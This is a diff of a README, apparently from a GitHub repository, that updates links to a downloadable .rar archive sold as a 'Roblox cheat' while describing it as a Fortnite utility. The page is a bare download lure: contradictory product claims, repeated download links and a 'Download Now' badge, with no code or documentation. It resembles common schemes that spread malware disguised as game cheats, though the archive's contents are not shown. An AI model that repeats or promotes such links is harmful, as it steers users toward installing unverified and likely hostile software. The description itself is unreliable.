@@ -1,6 +1,6 @@
 <div align="center">
   
-  🎯 [Roblox cheat](https://github.com/Zettafitzcolonnade/Roblox-skript/releases/download/Roblox-skript-V3/Roblox-skript-V3.rar)
+  🎯 [Roblox cheat](https://github.com/Zettafitzcolonnade/Roblox-skript/releases/download/Roblox-skript-V3.1/Roblox-skript-V3.1.rar)
 
  > **An unsurpassed, multi-functional and unobtrusive utility for Fortnite. Full control over the game.**
   
@@ -25,9 +25,9 @@
 ---
 
 
-### [⬇️ Download](https://github.com/Zettafitzcolonnade/Roblox-skript/releases/download/Roblox-skript-V3/Roblox-skript-V3.rar)
+### [⬇️ Download](https://github.com/Zettafitzcolonnade/Roblox-skript/releases/download/Roblox-skript-V3.1/Roblox-skript-V3.1.rar)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Zettafitzcolonnade/Roblox-skript/releases/download/Roblox-skript-V3/Roblox-skript-V3.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Zettafitzcolonnade/Roblox-skript/releases/download/Roblox-skript-V3.1/Roblox-skript-V3.1.rar)
 
 
 </div>
